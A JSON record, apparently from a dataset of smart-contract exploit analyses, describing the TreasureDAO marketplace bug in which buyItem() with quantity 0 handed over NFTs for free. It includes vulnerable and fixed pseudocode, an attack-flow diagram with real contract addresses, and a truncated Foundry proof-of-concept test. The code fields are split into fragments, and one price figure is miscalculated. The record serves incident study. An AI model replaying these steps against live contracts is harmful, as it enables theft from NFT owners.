@@ -1,0 +1,30 @@
+{
+ "id": "2022__2022-03-03_TreasureDAO_MarketplaceBuyItemFree",
+ "source_file": "2022/2022-03-03_TreasureDAO_MarketplaceBuyItemFree.md",
+ "title": "TreasureDAO — buyItem Free NFT Purchase Vulnerability Analysis",
+ "date": "2022-03-03",
+ "protocol": "TreasureDAO Marketplace",
+ "chain": "Arbitrum",
+ "loss_raw": "Multiple NFTs stolen for free (including SmolBrain NFTs)",
+ "loss_usd": null,
+ "root_cause": "`buyItem()` function does not validate the payment amount when called with quantity=0, allowing NFTs listed at normal prices to be purchased for 0 MAGIC",
+ "attack_tx": null,
+ "vulnerable_contract": "TreasureMarketplaceBuyer 0x812cdA2181ed7c45a35a691E0C85E231D218E273",
+ "classes": [
+  "nft"
+ ],
+ "code_before": [
+  "❌ Vulnerable TreasureMarketplaceBuyer.buyItem() (pseudocode)\ncontract TreasureMarketplaceBuyer {\n    IERC20 public MAGIC;\n\n    struct Listing {\n        address seller;\n        address nftAddress;\n        uint256 tokenId;\n        uint256 quantity;\n        uint256 pricePerItem;\n        uint256 expirationTime;\n    }\n\n    mapping(address => mapping(uint256 => Listing)) public listings;\n\n    function buyItem(\n        address _nftAddress,\n        uint256 _tokenId,\n        address _owner,\n        uint256 _quantity,  //",
+  "❌ 0 is allowed\n        uint256 _pricePerItem\n    ) external {\n        Listing memory listing = listings[_nftAddress][_tokenId];\n        require(listing.quantity >= _quantity, \"not enough quantity\");\n        require(listing.pricePerItem == _pricePerItem, \"price mismatch\");\n\n        //",
+  "❌ If _quantity = 0, payment amount = 0\n        uint256 totalPrice = _pricePerItem * _quantity;\n\n        if (totalPrice > 0) {\n            MAGIC.transferFrom(msg.sender, _owner, totalPrice);\n        }\n        //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\nfunction buyItem(..., uint256 _quantity, ...) external {\n    //",
+  "✅ quantity must be at least 1\n    require(_quantity > 0, \"quantity must be positive\");\n\n    uint256 totalPrice = _pricePerItem * _quantity;\n    require(totalPrice > 0, \"total price must be positive\");\n\n    MAGIC.transferFrom(msg.sender, _owner, totalPrice);\n    IERC721(_nftAddress).safeTransferFrom(_owner, msg.sender, _tokenId);\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Identify SmolBrain NFT #3557 listed on marketplace\n    │       Look up original seller address\n    │       ownerOf(3557) = seller address\n    │\n    ├─[2] Call TreasureMarketplaceBuyer.buyItem()\n    │       _nftAddress    = SmolBrain (0x6325439...)\n    │       _tokenId       = 3557\n    │       _owner         = seller address\n    │       _quantity      = 0          ← ⚡ Key: zero quantity\n    │       _pricePerItem  = 6,969,000,000,000,000,000,000 (6,969 MAGIC)\n    │\n    ├─[3] Contract processing:\n    │       totalPrice = 6,969e21 × 0 = 0\n    │       MAGIC payment skipped (totalPrice == 0)\n    │       IERC721.safeTransferFrom(seller, attacker, 3557) executed\n    │\n    ├─[4] NFT receipt confirmed via onERC721Received callback\n    │\n    └─[5] SmolBrain #3557 acquired for",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITreasureMarketplaceBuyer {\n    function buyItem(\n        address nftAddress,\n        uint256 tokenId,\n        address owner,\n        uint256 quantity,\n        uint256 pricePerItem\n    ) external;\n}\n\ninterface IERC721 {\n    function ownerOf(uint256 tokenId) external view returns (address);\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n}\n\ncontract ContractTest is Test {\n    ITreasureMarketplaceBuyer marketplace =\n        ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);\n    IERC721 smolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);\n    uint256 constant TOKEN_ID = 3557;\n\n    function setUp() public {\n        vm.createS"
+ ]
+}
